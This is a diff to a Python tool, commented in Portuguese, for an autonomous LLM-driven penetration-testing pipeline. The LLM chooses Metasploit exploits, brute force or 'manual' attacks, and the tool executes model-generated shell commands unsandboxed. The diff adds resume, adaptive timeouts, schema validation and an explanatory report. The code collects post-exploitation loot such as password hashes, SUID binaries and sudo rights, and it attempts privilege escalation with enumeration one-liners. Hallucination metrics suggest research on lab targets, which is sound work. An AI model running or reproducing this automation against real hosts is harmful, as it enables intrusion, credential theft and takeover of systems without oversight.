@@ -20,6 +20,8 @@ from src.llm_client import LLMClient
 from src.rag_engine import RagEngine
 from src.pipeline_common import PipelineBase, resolve_target
 from src import recon, wordlists
+from src import llm_schema
+from src.run_state import RunState
 from src.llm_metrics import METRICS
 
 # --- COLORS ---
@@ -34,12 +36,15 @@ API_KEY_PATH = "/app/config/api_key.txt"
 os.makedirs(LOOT_DIR, exist_ok=True)
 
 class PentestPipeline(PipelineBase):
-    def __init__(self, target_ip, attacker_ip, use_rag=True, only_port=None, allow_brute=True):
+    def __init__(self, target_ip, attacker_ip, use_rag=True, only_port=None,
+                 allow_brute=True, resume=False, explain=False):
         self.target_ip = target_ip
         self.attacker_ip = attacker_ip
         self.use_rag = use_rag
         self.only_port = str(only_port) if only_port else None
         self.allow_brute = allow_brute
+        self.resume = resume
+        self.explain = explain
         
         print("=== INICIALIZANDO PIPELINE AUTONOMO (V17 - SINGLE TARGET DIRECT) ===")
         print(f"[*] Alvo Definido: {self.target_ip}") 
@@ -66,13 +71,80 @@ class PentestPipeline(PipelineBase):
             sys.exit(1)
             
         self.history = []
-        self.open_ports = {} 
+        self.open_ports = {}
         self.session_id = None
         self.manual_access = None  # TIER C: foothold manual (sem sessao MSF)
         self.found_creds = []  # creds obtidas (brute) p/ reuso e chaining
         self._blocked_ports = set()  # portas cujo host bloqueou conexoes
         self.evidence = {}
         self.engine_ledger = {}  # por porta: qual motor atacou (MSF vs TIER C) e porque
+        self.explain_steps = []  # item 7: narrativa didatica por porta
+        self.kb_snapshot = None  # item 8: versao do KB usada nesta run
+        self.state = None        # item 5: estado persistente p/ resume
+        self.timeouts = self._init_timeouts()  # item 3: politica de timeouts
+        self._rtt_factor = 1.0   # item 3: multiplicador adaptativo (medido no alvo)
+
+    # --- item 3: TIMEOUTS ADAPTATIVOS -------------------------------------
+    def _init_timeouts(self):
+        """Orcamento de tempo por tipo de operacao (segundos). Base configuravel
+        por env; escalada em runtime pelo RTT medido ate o alvo (_rtt_factor)."""
+        def _g(name, default):
+            try:
+                return int(os.getenv(name, str(default)))
+            except Exception:
+                return default
+        return {
+            "enumeration": _g("RS_T_ENUM", 30),
+            "exploit": _g("RS_T_EXPLOIT", 40),       # leitura do run_module do exploit
+            "exploit_wait": _g("RS_T_EXPLOIT_WAIT", 20),  # espera a sessao surgir
+            "brute": _g("RS_T_BRUTE", 300),
+            "manual_cmd": _g("RS_T_MANUAL", 90),
+            "privesc": _g("RS_T_PRIVESC", 40),
+            "session_cmd": _g("RS_T_SESSION", 20),
+        }
+
+    def _t(self, kind):
+        """Timeout adaptativo p/ um tipo: base * fator de RTT, com teto por tipo."""
+        base = self.timeouts.get(kind, 30)
+        val = int(round(base * self._rtt_factor))
+        return max(base, min(val, base * 4))   # nunca abaixo da base, teto 4x
+
+    def _measure_rtt(self):
+        """Mede o RTT TCP ate uma porta aberta do alvo e define _rtt_factor.
+        Alvo lento/distante -> timeouts maiores (ate 3x). Generico (nao e logica
+        de ataque): so dimensiona esperas."""
+        ports = list(self.open_ports.keys()) if self.open_ports else []
+        if not ports:
+            return
+        samples = []
+        for p in ports[:3]:
+            try:
+                t0 = time.time()
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3.0)
+                if s.connect_ex((self.target_ip, int(p))) == 0:
+                    samples.append(time.time() - t0)
+                s.close()
+            except Exception:
+                pass
+        if samples:
+            rtt = sum(samples) / len(samples)
+            # 50ms como baseline (fator 1.0); 150ms -> ~3x; teto 3x.
+            self._rtt_factor = max(1.0, min(3.0, rtt / 0.05))
+            if self._rtt_factor > 1.05:
+                print(f"{C_YELLOW}[TIMEOUT] RTT medio {rtt*1000:.0f}ms -> fator "
+                      f"adaptativo {self._rtt_factor:.1f}x nos timeouts.{C_RESET}")
+
+    def _checkpoint(self):
+        """Persiste o estado atual (creds/ledger/acesso) p/ resume (item 5)."""
+        if not self.state:
+            return
+        self.state.set_creds(self.found_creds)
+        self.state.set_ledger(self.engine_ledger)
+        self.state.set_access(session_id=self.session_id,
+                              manual_port=(self.manual_access or {}).get("port")
+                              if self.manual_access else None)
+        self.state.save()
     
     def check_port(self, port):
         try:
@@ -200,6 +272,112 @@ class PentestPipeline(PipelineBase):
                 e.get("detail", ""), e.get("outcome", "(sem acesso)")))
         return out
 
+    # --- item 7: MODO EXPLAIN (narrativa didatica) -----------------------
+    def _rag_card_names(self, rag_context):
+        """Nomes dos cards do RAG que entraram no prompt (linhas NAME:/=== titulo ===)."""
+        names = []
+        for ln in (rag_context or "").splitlines():
+            t = ln.strip()
+            m = re.match(r"^NAME:\s*(.+)$", t)
+            if m:
+                nm = m.group(1).strip()[:80]
+                if nm and nm not in names:
+                    names.append(nm)
+            elif t.startswith("=== ") and t.endswith(" ==="):
+                nm = t.strip("= ").strip()[:80]
+                if nm and nm not in names:
+                    names.append(nm)
+        return names[:8]
+
+    def add_explain_step(self, port, banner, strategy, engine, confidence,
+                         reason, rag_context):
+        """Registra o 'porque' de uma decisao por porta para a narrativa didatica."""
+        self.explain_steps.append({
+            "port": str(port),
+            "service": banner,
+            "strategy": strategy,
+            "engine": engine,
+            "confidence": confidence,
+            "reason": reason or "(sem justificativa)",
+            "rag_cards": self._rag_card_names(rag_context) if self.use_rag else [],
+            "rag_enabled": bool(self.use_rag),
+            "outcome": "pendente",
+            "proof": "",
+        })
+
+    def update_explain_outcome(self, port, outcome, proof=""):
+        for st in reversed(self.explain_steps):
+            if st["port"] == str(port):
+                st["outcome"] = outcome
+                if proof:
+                    st["proof"] = proof
+                return
+
+    def generate_explain_report(self):
+        """Escreve uma narrativa em Markdown explicando CADA decisao (recon -> RAG
+        -> raciocinio do LLM -> motor -> resultado). Serve ao caso de uso de
+        APRENDIZADO: transforma a run num artefato de ensino."""
+        if not self.explain_steps:
+            return None
+        now = datetime.datetime.now()
+        safe_ip = self.target_ip.replace(".", "_")
+        fp = os.path.join(LOOT_DIR, f"explain_{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.md")
+        pwned = bool(self.session_id or self.manual_access)
+        L = []
+        L.append(f"# Narrativa da exploracao — {self.target_ip}")
+        L.append("")
+        L.append(f"- **Data:** {now:%Y-%m-%d %H:%M:%S}")
+        L.append(f"- **Resultado final:** {'PWNED' if pwned else 'sem acesso'}")
+        L.append(f"- **RAG:** {'habilitado' if self.use_rag else 'desativado (baseline)'}")
+        if self.kb_snapshot:
+            L.append(f"- **Snapshot do KB:** modelo `{self.kb_snapshot.get('embedding_model')}`, "
+                     f"{self.kb_snapshot.get('vector_count')} vetores, "
+                     f"fontes sha256 `{self.kb_snapshot.get('sources_sha256')}`")
+        L.append(f"- **Portas abertas:** {', '.join(str(p) for p in self.open_ports)}")
+        L.append("")
+        L.append("Cada secao abaixo mostra, para uma porta: o que o recon viu, quais "
+                 "cards do conhecimento (RAG) guiaram a decisao, o raciocinio do "
+                 "modelo, qual motor executou (Metasploit ou TIER C manual) e o que "
+                 "aconteceu. A decisao vem SEMPRE do LLM sobre o contexto — nao ha "
+                 "regra fixa por porta.")
+        L.append("")
+        for i, st in enumerate(self.explain_steps, 1):
+            L.append(f"## {i}. Porta {st['port']} — {st['service']}")
+            L.append("")
+            L.append(f"**Decisao do modelo:** `{st['strategy']}` "
+                     f"(confianca {st['confidence']}) · **motor:** {st['engine']}")
+            L.append("")
+            if st["rag_enabled"]:
+                if st["rag_cards"]:
+                    L.append("**Conhecimento (RAG) que embasou a decisao:**")
+                    for c in st["rag_cards"]:
+                        L.append(f"- {c}")
+                else:
+                    L.append("**Conhecimento (RAG):** nenhum card nomeado recuperado "
+                             "para esta porta.")
+            else:
+                L.append("**Conhecimento (RAG):** desativado nesta run (baseline do "
+                         "modelo puro).")
+            L.append("")
+            L.append("**Raciocinio do modelo:**")
+            L.append(f"> {st['reason']}")
+            L.append("")
+            L.append(f"**Resultado:** {st['outcome']}")
+            if st["proof"]:
+                L.append("")
+                L.append(f"**Prova:** {st['proof']}")
+            L.append("")
+        try:
+            with open(fp, "w", encoding="utf-8") as f:
+                f.write("\n".join(L))
+            print(f"{C_GREEN}[EXPLAIN] narrativa didatica salva: {fp}{C_RESET}")
+            if self.explain:
+                print(f"\n{C_CYAN}{'='*60}\n[MODO EXPLAIN]\n{'='*60}{C_RESET}")
+                print("\n".join(L))
+        except Exception as e:
+            print(f"{C_RED}[EXPLAIN] nao salvou narrativa: {e}{C_RESET}")
+        return fp
+
     # --- RELATORIO ---
     def generate_text_report(self):
         now = datetime.datetime.now()
@@ -210,13 +388,29 @@ class PentestPipeline(PipelineBase):
         eng_lines = self.render_engine_ledger()
         for _el in eng_lines:
             print(f"{C_MAGENTA}{_el}{C_RESET}")   # tambem ao vivo nos logs
+        kb = getattr(self, "kb_snapshot", None)
+        kb_line = "KB SNAPSHOT: (RAG desativado)"
+        if kb:
+            kb_line = ("KB SNAPSHOT: modelo=%s | vetores=%s | fontes=%s | sha256=%s" % (
+                kb.get("embedding_model"), kb.get("vector_count"),
+                kb.get("sources_files"), kb.get("sources_sha256")))
         lines = [
             "="*50, "RELATORIO FINAL", "="*50,
             f"DATA: {now}", f"STATUS: {'PWNED' if (self.session_id or self.manual_access) else 'FALHA'}", "-"*50,
             f"PORTAS: {list(self.open_ports.keys())}",
+            kb_line,
         ] + eng_lines + ["\n[HISTORICO]"] + [f"- {h}" for h in self.history]
-        
+
         ev = getattr(self, 'evidence', {}) or {}
+        loot = ev.get("loot")
+        if loot:
+            lines.append("")
+            lines.append("[LOOT POS-EXPLORACAO]")
+            for k in ("id", "os", "sudo", "suid", "network", "cron", "hashes"):
+                v = loot.get(k)
+                if v:
+                    lines.append("--- %s ---" % k.upper())
+                    lines.append(str(v)[:1200])
         mp = ev.get("manual_proof")
         if ev.get("shell_info") or mp:
             lines.append("")
@@ -253,17 +447,21 @@ class PentestPipeline(PipelineBase):
                 target=self.target_ip,
                 attacker=getattr(self, "attacker_ip", None),
                 rag_enabled=getattr(self, "use_rag", True),
+                kb_snapshot=getattr(self, "kb_snapshot", None),
             )
         except Exception:
             pass
 
-    def session_exec(self, cmd, timeout=20):
+    def session_exec(self, cmd, timeout=None):
         """Executa UM comando na sessao MSF pelo console:
         'sessions -c <cmd> -i <sid>'. Caminho unico e confiavel para shell e
         meterpreter (substitui shell_write/shell_read, que eram instaveis).
-        Faz quoting POSIX seguro do comando (aspas simples + escape de ')."""
+        Faz quoting POSIX seguro do comando (aspas simples + escape de ').
+        timeout=None usa o orcamento adaptativo de 'session_cmd' (item 3)."""
         if not self.session_id:
             return ""
+        if timeout is None:
+            timeout = self._t("session_cmd")
         safe = "'" + str(cmd).replace("'", "'\\''") + "'"
         line = "sessions -c %s -i %s" % (safe, self.session_id)
         try:
@@ -528,12 +726,7 @@ PAYLOAD / SHELL-QUOTING RULES (the #1 cause of failed web PoCs - follow exactly)
 If the output above already proves execution on the target, set done=true.
 """
             resp = self.ask_llm_robust(prompt, expect_json=True)
-            plan = None
-            if resp:
-                try:
-                    plan = json.loads(resp)
-                except Exception:
-                    plan = None
+            plan, perrs = llm_schema.validate_action_plan(resp, default_check="")
             if plan is None:
                 # Rodada ruim (sem JSON valido apos retries): NAO mata o TIER C;
                 # registra e segue p/ a proxima rodada com um lembrete corretivo.
@@ -541,16 +734,18 @@ If the output above already proves execution on the target, set done=true.
                 history.append(("(no valid command this round)", "Your previous "
                     "reply was not valid JSON. Reply with ONLY the JSON object."))
                 continue
-            check = (plan.get("success_check") or "").strip()
-            print(f"{C_BLUE}[MANUAL] {plan.get('reason', '(sem motivo)')}{C_RESET}")
-            cmds = plan.get("commands") or []
-            if plan.get("done") and not cmds:
+            if perrs:
+                print(f"{C_YELLOW}[MANUAL] schema: {'; '.join(perrs)}{C_RESET}")
+            check = plan["success_check"]
+            print(f"{C_BLUE}[MANUAL] {plan['reason'] or '(sem motivo)'}{C_RESET}")
+            cmds = plan["commands"]
+            if plan["done"] and not cmds:
                 break
             for cmd in cmds:
                 print(f"{C_YELLOW}[MANUAL] $ {cmd}{C_RESET}")
                 try:
                     r = subprocess.run(["bash", "-c", cmd], capture_output=True,
-                                       text=True, timeout=90, cwd=workdir)
+                                       text=True, timeout=self._t("manual_cmd"), cwd=workdir)
                     output = (r.stdout or "") + (r.stderr or "")
                 except Exception as e:
                     output = f"[erro ao executar: {e}]"
@@ -580,9 +775,31 @@ If the output above already proves execution on the target, set done=true.
 
     def run(self):
         self.cleanup_sessions()
+        # item 5: estado persistente (resume de run interrompida)
+        self.state = RunState.load_or_new(self.target_ip, self.resume)
+        if self.state.is_resumed:
+            print(f"{C_YELLOW}[RESUME] Estado anterior de {self.target_ip} "
+                  f"(run {self.state.data.get('run_id')}); retomando.{C_RESET}")
+            self.found_creds = self.state.get_creds()
+            self.engine_ledger = self.state.get_ledger()
+        # item 8: snapshot do KB usado nesta run (reprodutibilidade)
+        if self.use_rag and getattr(self, "rag", None):
+            try:
+                self.kb_snapshot = self.rag.snapshot()
+                print(f"{C_MAGENTA}[KB] snapshot: {self.kb_snapshot}{C_RESET}")
+            except Exception:
+                self.kb_snapshot = None
+
         print(f"\n>>> [FASE 1] RECONHECIMENTO")
-        rec = recon.scan(self.target_ip)
-        self.os_hint = rec.get("os", "") or "unknown"
+        rec = self.state.get_recon() if self.state.is_resumed else None
+        if rec:
+            print(f"{C_YELLOW}[RESUME] Reaproveitando recon em cache (sem re-scan).{C_RESET}")
+            self.os_hint = self.state.data.get("os_hint") or "unknown"
+        else:
+            rec = recon.scan(self.target_ip)
+            self.os_hint = rec.get("os", "") or "unknown"
+            self.state.set_recon(rec, self.os_hint)
+            self.state.save()
         self.services = rec.get("ports", {})
         if self.only_port:
             self.services = {pp: ii for pp, ii in self.services.items() if str(pp) == self.only_port}
@@ -596,13 +813,23 @@ If the output above already proves execution on the target, set done=true.
             self.open_ports[p] = info.get("banner", "")
             print(f"    {C_GREEN}[+] Porta {p}: {info.get('banner','')}{C_RESET}")
 
+        # item 3: mede o RTT ao alvo e dimensiona os timeouts adaptativos
+        self._measure_rtt()
+
         modo_fase2 = "100% RAG DRIVEN" if self.use_rag else "LLM ONLY - SEM RAG (baseline)"
         print(f"\n>>> [FASE 2] ANALISE DINAMICA ({modo_fase2})")
         wordlist_creds = self.load_credentials()
 
         # Fila de ataque: em falha, a porta volta p/ a fila para o LLM escolher
         # uma ESTRATEGIA alternativa (fallback guiado pelo modelo, nao hardcoded).
-        attack_queue = [(pp, bb, "", []) for pp, bb in self.open_ports.items()]
+        # No resume (item 5), portas ja resolvidas (terminal) sao puladas.
+        attack_queue = []
+        for pp, bb in self.open_ports.items():
+            if self.state.is_resumed and self.state.is_terminal(pp):
+                print(f"{C_YELLOW}[RESUME] Porta {pp} ja resolvida "
+                      f"({self.state.port(pp)['status']}); pulando.{C_RESET}")
+                continue
+            attack_queue.append((pp, bb, "", []))
         MAX_STRATS = 3  # tentativas de estrategia por porta
         while attack_queue:
             port, banner, fail_note, tried = attack_queue.pop(0)
@@ -791,59 +1018,73 @@ If the output above already proves execution on the target, set done=true.
             - Your goal is accuracy, not exploitation speed.
             """
             
-            resp = self.ask_llm_robust(prompt)
-            plan = {}
-            if resp:
-                try: 
-                    if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
-                    plan = json.loads(resp)
-                except: pass
-
-            strategy = plan.get('strategy', 'skip').lower()
-            if not self.allow_brute and strategy == "brute_force":
-                print(f"{C_YELLOW}[POLICY] Brute force desativado: ignorando 'brute_force' na porta {port}.{C_RESET}")
-                strategy = "skip"
-            module = plan.get('module', '').strip()
-            if not module: module = plan.get('module_name', '').strip()
-            
-            llm_options = plan.get('options', {})
-            
-            if resp:
-                _msf_strats = ("exploit_cve", "brute_force", "enumeration")
-                if strategy in _msf_strats:
-                    _eng = "METASPLOIT (TIER A/B)"
-                    _why = "modulo: %s" % (module or "(a definir via msfconsole)")
-                elif strategy == "manual":
-                    _eng = "MANUAL (TIER C / RAG-guided)"
-                    _why = ("LLM decidiu exploracao manual guiada por RAG: Metasploit "
-                            "NAO cobre esta classe (ex.: logica/injecao de app web SPA)")
-                    _why = "".join(_why)
-                else:
-                    _eng = "NENHUM"; _why = "LLM decidiu nao atacar (skip)"
-                self.record_engine(port, _eng, strategy=strategy, detail=_why)
-                print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}' | MOTOR: {_eng}{C_RESET}")
-                if strategy == "manual":
-                    print(f"{C_MAGENTA}[MOTOR] Porta {port}: EXPLORACAO MANUAL (TIER C) guiada por RAG "
-                          f"- Metasploit NAO cobre esta classe (sem modulo).{C_RESET}")
-                elif strategy in _msf_strats:
-                    print(f"{C_MAGENTA}[MOTOR] Porta {port}: via METASPLOIT ({strategy}) - {_why}.{C_RESET}")
-
-            if not resp:
-                print(f"{C_RED}[LLM] Modelo indisponivel apos retries: sem decisao para a porta {port}. "
-                      f"Pulando (sem fallback hardcoded).{C_RESET}")
+            # --- DECISAO: validada por schema + vocabulario FECHADO (itens 1 e 2) ---
+            resp = self.ask_llm_robust(prompt, expect_json=True)
+            decision, derrs = llm_schema.validate_decision(resp)
+            if decision is None:
+                # Sem JSON valido apos retries = modelo indisponivel; sem fallback
+                # hardcoded (invariante de pesquisa preservado).
+                print(f"{C_RED}[LLM] Sem decisao JSON valida para a porta {port}. Pulando.{C_RESET}")
+                self.state.set_port(port, "skipped", tried=tried, note="sem JSON do LLM")
+                self.state.save()
                 continue
-            if strategy == "manual":
+            if derrs:
+                print(f"{C_YELLOW}[SCHEMA] {'; '.join(derrs)}{C_RESET}")
+
+            strategy = decision["strategy"]              # ja coagido ao enum fechado
+            if not self.allow_brute and strategy == llm_schema.Strategy.BRUTE_FORCE:
+                print(f"{C_YELLOW}[POLICY] Brute force desativado: ignorando 'brute_force' na porta {port}.{C_RESET}")
+                strategy = llm_schema.Strategy.SKIP
+            module = decision["module_name"]
+            llm_options = dict(decision["options"])
+            confidence = decision["confidence"]
+            reason = decision["reason"]
+
+            _msf_strats = (llm_schema.Strategy.EXPLOIT_CVE,
+                           llm_schema.Strategy.BRUTE_FORCE,
+                           llm_schema.Strategy.ENUMERATION)
+            if strategy in _msf_strats:
+                _eng = "METASPLOIT (TIER A/B)"
+                _why = "modulo: %s" % (module or "(a definir via msfconsole)")
+            elif strategy == llm_schema.Strategy.MANUAL:
+                _eng = "MANUAL (TIER C / RAG-guided)"
+                _why = ("LLM decidiu exploracao manual guiada por RAG: Metasploit "
+                        "NAO cobre esta classe (ex.: logica/injecao de app web SPA)")
+            else:
+                _eng = "NENHUM"; _why = "LLM decidiu nao atacar (skip)"
+            self.record_engine(port, _eng, strategy=strategy, detail=_why)
+            # item 7: captura a etapa para a narrativa didatica
+            self.add_explain_step(port, banner, strategy, _eng, confidence, reason, rag_context)
+            print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}' | "
+                  f"Confianca: {confidence} | MOTOR: {_eng}{C_RESET}")
+            if strategy == llm_schema.Strategy.MANUAL:
+                print(f"{C_MAGENTA}[MOTOR] Porta {port}: EXPLORACAO MANUAL (TIER C) guiada por RAG "
+                      f"- Metasploit NAO cobre esta classe (sem modulo).{C_RESET}")
+            elif strategy in _msf_strats:
+                print(f"{C_MAGENTA}[MOTOR] Porta {port}: via METASPLOIT ({strategy}) - {_why}.{C_RESET}")
+
+            if strategy == llm_schema.Strategy.MANUAL:
                 self.run_manual_exploit(port, banner, web_context, rag_context)
-                if self.manual_access and str(self.manual_access.get("port")) == str(port):
+                _ok = bool(self.manual_access and str(self.manual_access.get("port")) == str(port))
+                if _ok:
                     self.record_engine(port, "MANUAL (TIER C / RAG-guided)",
                                        outcome="PWNED (foothold manual via TIER C, sem sessao MSF)")
+                    self.update_explain_outcome(port, "PWNED via TIER C (foothold manual)",
+                                                proof=(self.manual_access or {}).get("proof", ""))
+                    self.state.set_port(port, "success", tried=tried + ["manual"])
                 else:
                     self.record_engine(port, "MANUAL (TIER C / RAG-guided)", outcome="falhou")
+                    self.update_explain_outcome(port, "falhou (TIER C sem prova de execucao)")
+                    self.state.set_port(port, "failed", tried=tried + ["manual"], exhausted=True)
+                self._checkpoint()
                 if self.session_id or self.manual_access:
                     break
                 continue
-            if strategy == "skip" or not module:
+            if strategy == llm_schema.Strategy.SKIP or not module:
                 print(f"{C_YELLOW}[AI] O modelo decidiu nao atacar a porta {port}.{C_RESET}")
+                self.update_explain_outcome(port, "sem ataque (skip)")
+                self.state.set_port(port, "skipped", tried=tried)
+                self._checkpoint()
                 continue
 
             if self.allow_brute and ("login" in module or "credential" in module): strategy = "brute_force"
@@ -882,15 +1123,13 @@ If the output above already proves execution on the target, set done=true.
                               f"Contexto (RAG):\n{rag_context}\n"
                               f"Responda SOMENTE JSON com um modulo Metasploit REAL e valido: "
                               f'{{"module_type":"auxiliary|exploit","module_name":"cat/serv/mod","strategy":"enumeration|brute_force|exploit_cve"}}')
-                fresp = self.ask_llm_robust(fix_prompt)
+                fresp = self.ask_llm_robust(fix_prompt, expect_json=True)
+                fdec, _ferrs = llm_schema.validate_decision(fresp)
                 fixed = ""
-                if fresp:
-                    try:
-                        if "{" in fresp: fresp = fresp[fresp.find("{"):fresp.rfind("}")+1]
-                        fp = json.loads(fresp)
-                        fixed = (fp.get("module_name") or "").strip()
-                        if fp.get("strategy"): strategy = fp["strategy"].lower()
-                    except Exception: pass
+                if fdec:
+                    fixed = fdec["module_name"]
+                    if fdec["strategy"] != llm_schema.Strategy.SKIP:
+                        strategy = fdec["strategy"]
                 if fixed:
                     module = fixed
                     clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
@@ -925,7 +1164,8 @@ If the output above already proves execution on the target, set done=true.
                 out = self.msf.run_login_scanner(m_name, opts,
                                                  userpass_file=wl["userpass_file"],
                                                  user_file=wl["user_file"],
-                                                 pass_file=wl["pass_file"]) or ""
+                                                 pass_file=wl["pass_file"],
+                                                 timeout=self._t("brute")) or ""
                 if "is blocked" in out.lower() or "many connection errors" in out.lower():
                     self._blocked_ports.add(port)
                     print(f"{C_RED}[CONNECTION WALL] {m_name}: host bloqueou conexoes (max_connect_errors); nao insistir nesta porta.{C_RESET}")
@@ -949,7 +1189,7 @@ If the output above already proves execution on the target, set done=true.
             elif strategy == "enumeration":
                 print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
                 try:
-                    self.msf.run_module(m_type, m_name, opts)
+                    self.msf.run_module(m_type, m_name, opts, timeout=self._t("enumeration"))
                     time.sleep(4)
                     print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
                 except Exception as e: print(f"{C_RED}[ERRO] {e}{C_RESET}")
@@ -969,14 +1209,16 @@ If the output above already proves execution on the target, set done=true.
                     print(f"\n{C_YELLOW}[DEBUG] Tentativa {attempt}/{max_attempts} - Executando {m_type}/{m_name}{C_RESET}")
                     print(f"{C_YELLOW}[DEBUG] Opcoes injetadas pela IA: {opts}{C_RESET}")
                     
-                    mod_output = self.msf.run_module(m_type, m_name, opts) or ""
+                    mod_output = self.msf.run_module(m_type, m_name, opts,
+                                                     timeout=self._t("exploit")) or ""
                     if mod_output and "unknown datastore option" in mod_output.lower():
                         for _opt in re.findall(r"(?i)Unknown datastore option:?\s*([A-Za-z0-9_]+)", mod_output):
                             METRICS.record_hallucination("opcao_inexistente", f"{m_name}: {_opt}")
                     if mod_output.strip():
                         print(f"{C_YELLOW}[MSF OUTPUT]\n{mod_output}{C_RESET}")
-                    print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
-                    time.sleep(20) 
+                    _wait = self._t("exploit_wait")
+                    print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando {_wait}s...{C_RESET}")
+                    time.sleep(_wait)
                     
                     sessions = self.msf.client.call('session.list') or {}
                     if sessions:
@@ -1060,33 +1302,26 @@ If the output above already proves execution on the target, set done=true.
                           "reason": "Explain exactly what you changed and why (cite the output)."
                         }}
                         """
-                        resp = self.ask_llm_robust(retry_prompt)
-                        if resp:
-                            try:
-                                if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
-                                new_plan = json.loads(resp)
-                                
-                                if False:  # aborto precoce desabilitado: esgota todas as tentativas
-                                    print(f"{C_RED}[AI] Decidiu abortar as tentativas: {new_plan.get('reason')}{C_RESET}")
-                                    break
-                                
-                                # ATUALIZA COM NOVA SUGESTÃO
-                                nm = (new_plan.get("module_name") or "").strip()
-                                if nm:
-                                    cn = nm.replace("exploit/", "").replace("auxiliary/", "").strip("/")
-                                    if self.msf.verify_module_exists("exploit", cn):
-                                        m_type, m_name = "exploit", cn
-                                        print(f"{C_BLUE}[AI] Trocando de modulo para: exploit/{m_name}{C_RESET}")
-                                    else:
-                                        METRICS.record_hallucination("modulo_inexistente", nm)
-                                        print(f"{C_RED}[AI] Modulo sugerido invalido: {nm} (mantendo o atual){C_RESET}")
-                                for _rk in (new_plan.get("remove_options") or []):
-                                    opts.pop(_rk, None)
-                                new_opts = new_plan.get("options", {})
-                                opts.update(new_opts) 
-                                print(f"{C_BLUE}[AI AUTO-CORRECTION] {new_plan.get('reason', 'Parametros ajustados.')}{C_RESET}")
-                            except Exception as e:
-                                print(f"{C_RED}[ERRO AI] Falha ao processar reajuste.{C_RESET}")
+                        resp = self.ask_llm_robust(retry_prompt, expect_json=True)
+                        new_plan, _rerrs = llm_schema.validate_retry(resp)
+                        if new_plan:
+                            if _rerrs:
+                                print(f"{C_YELLOW}[SCHEMA] retry: {'; '.join(_rerrs)}{C_RESET}")
+                            # ATUALIZA COM NOVA SUGESTÃO (nome ja validado no schema)
+                            nm = new_plan["module_name"]
+                            if nm:
+                                if self.msf.verify_module_exists("exploit", nm):
+                                    m_type, m_name = "exploit", nm
+                                    print(f"{C_BLUE}[AI] Trocando de modulo para: exploit/{m_name}{C_RESET}")
+                                else:
+                                    METRICS.record_hallucination("modulo_inexistente", nm)
+                                    print(f"{C_RED}[AI] Modulo sugerido invalido: {nm} (mantendo o atual){C_RESET}")
+                            for _rk in new_plan["remove_options"]:
+                                opts.pop(_rk, None)
+                            opts.update(new_plan["options"])
+                            print(f"{C_BLUE}[AI AUTO-CORRECTION] {new_plan['reason'] or 'Parametros ajustados.'}{C_RESET}")
+                        else:
+                            print(f"{C_RED}[ERRO AI] Reajuste sem JSON valido; mantendo opcoes.{C_RESET}")
                 
                 if not self.session_id:
                     print(f"{C_RED}[FALHA GERAL] Todas as tentativas de exploit falharam.{C_RESET}")
@@ -1101,19 +1336,39 @@ If the output above already proves execution on the target, set done=true.
                             self.record_engine(port, "MANUAL (TIER C / RAG-guided)",
                                                outcome="PWNED (TIER C apos falha do MSF)")
 
-            if not (self.session_id or self.manual_access):
-                if strategy in ("brute_force", "enumeration", "exploit_cve") and len(tried) + 1 < MAX_STRATS and port not in self._blocked_ports:
+            # --- desfecho da porta: estado (item 5) + narrativa (item 7) ---
+            _access = bool(self.session_id or self.manual_access)
+            if _access:
+                _proof = (self.manual_access or {}).get("proof", "") if self.manual_access else ""
+                self.update_explain_outcome(port, "PWNED (%s)" % ("sessao MSF" if self.session_id else "TIER C"), proof=_proof)
+                self.state.set_port(port, "success", tried=tried + [strategy])
+            elif port in self._blocked_ports:
+                self.update_explain_outcome(port, "host bloqueou conexoes (connection wall)")
+                self.state.set_port(port, "blocked", tried=tried + [strategy])
+            else:
+                _requeue = (strategy in (llm_schema.Strategy.BRUTE_FORCE,
+                                         llm_schema.Strategy.ENUMERATION,
+                                         llm_schema.Strategy.EXPLOIT_CVE)
+                            and len(tried) + 1 < MAX_STRATS)
+                if _requeue:
                     attack_queue.insert(0, (port, banner, f"'{strategy}' nao obteve shell", tried + [strategy]))
                     print(f"{C_YELLOW}[*] Estrategia '{strategy}' falhou na porta {port}; reconsultando o LLM por uma estrategia ALTERNATIVA...{C_RESET}")
-            if self.session_id or self.manual_access:
+                    self.state.set_port(port, "failed", tried=tried + [strategy], exhausted=False)
+                else:
+                    self.update_explain_outcome(port, "falhou (estrategias esgotadas)")
+                    self.state.set_port(port, "failed", tried=tried + [strategy], exhausted=True)
+            self._checkpoint()
+            if _access:
                 print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                 break
-        
+
         if self.session_id:
             self.phase_4_post_exploitation()
             self.phase_5_privesc()
+            self._checkpoint()
         self.store_attack_experience()
         self.generate_text_report()
+        self.generate_explain_report()   # item 7: narrativa didatica
 
     def _add_cred(self, port, banner, user, pwd):
         """Guarda uma credencial valida obtida no brute para reuso/chaining."""
@@ -1158,7 +1413,8 @@ If the output above already proves execution on the target, set done=true.
         print(f"\n>>> [FASE 5] ESCALONAMENTO DE PRIVILEGIO (uid != 0)")
 
         def sh(cmd, wait=4):
-            return self.session_exec(cmd, timeout=max(30, wait * 5))
+            # timeout adaptativo (item 3): base de privesc escalada pelo RTT
+            return self.session_exec(cmd, timeout=self._t("privesc"))
 
         enum = sh("id; uname -a; sudo -n -l 2>/dev/null; "
                   "find / -perm -4000 -type f 2>/dev/null | head -40; "
@@ -1195,21 +1451,17 @@ Return JSON ONLY:
 {{"commands": ["cmd1", "cmd2"], "success_check": "uid=0", "done": false, "reason": "what/why"}}
 If the history already shows uid=0(root), set done=true.
 """
-            resp = self.ask_llm_robust(prompt)
-            if not resp:
-                print(f"{C_RED}[PRIVESC] LLM sem resposta.{C_RESET}")
+            resp = self.ask_llm_robust(prompt, expect_json=True)
+            plan, errs = llm_schema.validate_action_plan(resp, default_check="uid=0")
+            if plan is None:
+                print(f"{C_RED}[PRIVESC] Sem JSON valido do LLM.{C_RESET}")
                 break
-            try:
-                if "{" in resp:
-                    resp = resp[resp.find("{"):resp.rfind("}") + 1]
-                plan = json.loads(resp)
-            except Exception:
